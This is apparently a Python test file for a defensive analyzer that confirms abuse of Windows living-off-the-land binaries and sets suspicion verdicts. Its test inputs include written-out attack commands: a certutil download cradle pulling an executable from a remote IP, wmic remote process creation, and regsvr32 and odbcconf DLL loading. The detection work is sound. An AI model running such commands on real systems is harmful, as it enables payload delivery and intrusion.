"""Tests for Layer 4 — LOLBAS argument confirmation."""
from __future__ import annotations

import unittest

from core import cmdline_analyzer as ca
from core import lolbas_lookup
from core.scripts.extract_lolbas import skeleton_tokens


class TestSkeletonDerivation(unittest.TestCase):
    """The skeleton is derived from LOLBAS' own placeholder markup, not guessed."""

    def test_placeholders_are_removed(self) -> None:
        # "-f" is dropped as well: a two-character switch is generic across
        # essentially every tool, so it adds no specificity. "-urlcache" is what
        # actually identifies the documented abuse.
        self.assertEqual(
            skeleton_tokens("certutil.exe -urlcache -f {REMOTEURL:.exe} {PATH:.exe}",
                            "certutil.exe"),
            ["-urlcache"],
        )

    def test_generic_two_character_switches_are_dropped(self) -> None:
        self.assertEqual(skeleton_tokens("tool.exe -f -a {PATH}", "tool.exe"), [])

    def test_binary_name_is_excluded(self) -> None:
        # Matching the binary is the plain LOLBAS lookup's job; including it here
        # would let a skeleton "confirm" on nothing but the binary name.
        self.assertNotIn("regsvr32", skeleton_tokens("regsvr32 /s /i:{REMOTEURL}", "regsvr32.exe"))

    def test_switch_values_are_truncated_to_the_switch(self) -> None:
        # LOLBAS writes a worked example address; keeping it would make the
        # skeleton unmatchable rather than specific.
        self.assertEqual(
            skeleton_tokens('wmic.exe /node:"192.168.0.1" process call create', "wmic.exe"),
            ["/node:", "process", "call", "create"],
        )

    def test_syntax_fragments_are_dropped(self) -> None:
        self.assertEqual(skeleton_tokens('mshta.exe javascript:x();close()', "mshta.exe"), [])

    def test_paths_are_dropped(self) -> None:
        self.assertEqual(skeleton_tokens(r"foo.exe C:\Windows\Temp\x.dll", "foo.exe"), [])


class TestDataset(unittest.TestCase):
    def test_dataset_loads(self) -> None:
        table = lolbas_lookup.load_lolbas_commands()
        self.assertGreater(len(table), 50)

    def test_no_skeleton_is_information_free(self) -> None:
        # The rule this project arrived at three times: a pattern matching
        # anything is worse than no pattern, because it lends false specificity.
        for binary, records in lolbas_lookup.load_lolbas_commands().items():
            for record in records:
                skeleton = record["skeleton"]
                self.assertTrue(skeleton, binary)
                switchy = any(t[:1] in ("-", "/") for t in skeleton)
                self.assertTrue(len(skeleton) >= 2 or switchy, f"{binary}: {skeleton}")

    def test_layer_2_table_is_untouched(self) -> None:
        # The Layer 4 dataset is a separate file precisely so the shipped
        # process module carries no regression risk from this addition.
        self.assertIsNotNone(lolbas_lookup.lookup("certutil.exe"))
        self.assertNotIn("skeleton", lolbas_lookup.lookup("certutil.exe"))

    def test_lookup_commands_accepts_a_full_path(self) -> None:
        self.assertTrue(lolbas_lookup.lookup_commands(r"C:\Windows\System32\certutil.exe"))

    def test_unknown_binary_returns_empty(self) -> None:
        self.assertEqual(lolbas_lookup.lookup_commands("definitely-not-a-lolbin.exe"), [])
        self.assertEqual(lolbas_lookup.lookup_commands(""), [])

    def test_missing_dataset_degrades(self) -> None:
        lolbas_lookup.load_lolbas_commands.cache_clear()
        original = lolbas_lookup._COMMANDS_FILE
        try:
            lolbas_lookup._COMMANDS_FILE = original.with_name("absent.json")
            self.assertEqual(lolbas_lookup.load_lolbas_commands(), {})
        finally:
            lolbas_lookup._COMMANDS_FILE = original
            lolbas_lookup.load_lolbas_commands.cache_clear()


class TestMatching(unittest.TestCase):
    def _cross(self, line: str) -> dict:
        result = ca.analyze_command_line(ca.CommandLineInput(command_line=line))
        return result.lolbas_cross_check or {}

    def test_documented_abuse_is_confirmed(self) -> None:
        cross = self._cross("certutil.exe -urlcache -split -f http://198.51.100.9/a.exe a.exe")
        self.assertEqual(cross["match_strength"], "CONFIRMED_ABUSE_PATTERN")
        self.assertEqual(cross["binary"], "certutil.exe")

    def test_benign_use_of_a_dual_use_binary_is_not_confirmed(self) -> None:
        # certutil is in LOLBAS, but hashing a file is not the abuse pattern.
        cross = self._cross("certutil.exe -hashfile C:\\downloads\\release.zip SHA256")
        self.assertEqual(cross["match_strength"], "DUAL_USE_PRESENT")

    def test_wmic_process_creation_is_confirmed(self) -> None:
        cross = self._cross('wmic.exe process call create "cmd.exe /c whoami"')
        self.assertEqual(cross["match_strength"], "CONFIRMED_ABUSE_PATTERN")

    def test_non_lolbas_binary_yields_nothing(self) -> None:
        self.assertEqual(self._cross(r'"C:\Program Files\Vendor\agent.exe" --service'), {})

    def test_confirmation_carries_provenance(self) -> None:
        cross = self._cross("certutil.exe -urlcache -f http://198.51.100.9/a.exe a.exe")
        self.assertTrue(cross["category"])
        self.assertTrue(cross["reference"])


class TestVerdictAuthority(unittest.TestCase):
    def test_confirmation_floors_the_verdict_at_suspicious(self) -> None:
        self.assertTrue(ca.LOLBAS_SETS_SUSPICIOUS_FLOOR)
        result = ca.analyze_command_line(ca.CommandLineInput(
            command_line="odbcconf.exe /a {regsvr C:\\temp\\x.dll}"))
        if (result.lolbas_cross_check or {}).get("match_strength") == "CONFIRMED_ABUSE_PATTERN":
            self.assertNotEqual(result.aggregated_verdict, "Unknown")

    def test_confirmation_does_not_count_as_corroboration(self) -> None:
        # Not granted: corroboration unlocks Malicious, and 32 benign samples is
        # a thin basis for that authority.
        self.assertFalse(ca.LOLBAS_COUNTS_AS_CORROBORATION)
        result = ca.analyze_command_line(ca.CommandLineInput(
            command_line="certutil.exe -urlcache -f http://198.51.100.9/a.exe a.exe"))
        result.rule_matches = []
        result.was_obfuscated = True
        result.revealed_keywords = ["DOWNLOAD_CRADLE"]
        self.assertEqual(ca.aggregate_verdict(result), "Suspicious")

    def test_dual_use_alone_never_escalates(self) -> None:
        # Plan §4 rule 6, and the reason the calibration gate exempts this flag
        # from its false-positive count.
        for line in (
            r'msiexec.exe /i "C:\ProgramData\vendor\agent.msi" /qn',
            "certutil.exe -hashfile C:\\downloads\\release.zip SHA256",
            "wmic.exe csproduct get name",
        ):
            with self.subTest(line=line):
                result = ca.analyze_command_line(ca.CommandLineInput(command_line=line))
                self.assertEqual(result.aggregated_verdict, "Unknown")
                ids = {f["id"] for f in result.flags}
                self.assertLessEqual(ids, {lolbas_lookup.DUAL_USE_BINARY})


if __name__ == "__main__":
    unittest.main()
